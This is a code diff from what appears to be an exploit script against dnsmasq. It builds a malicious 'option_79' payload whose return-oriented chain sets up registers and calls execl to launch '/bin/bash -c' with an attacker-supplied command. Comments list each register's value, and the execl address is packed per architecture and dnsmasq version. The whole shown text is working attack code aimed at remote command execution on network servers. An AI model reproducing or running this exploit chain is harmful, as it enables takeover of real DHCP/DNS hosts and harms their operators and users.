@@ -683,12 +683,18 @@ def exploit():
         # RAX = 0x0000000000000000
         option_79 += register_management(architecture, dnsmasq_version, "rax", 0x0000000000000000)
 
-        # EDX = "interpreter argument"
+        # EDX = address("interpreter argument")
         option_79 += register_management(architecture, dnsmasq_version, "rdx", interpreter_arg_addr)
 
         # option_79 += Base.pack64(CRASH[architecture])  # crash for debug
 
-        # EXECL
+        # R8D = 0x0
+        # ECX = address("bash_command")
+        # EDX = address("-c")
+        # ESI = address("/bin/bash")
+        # EDI = address("/bin/bash")
+        # EAX = 0x0
+        # call EXECL
         option_79 += Base.pack64(EXECL[architecture][dnsmasq_version])  # address of execl
 
     else:
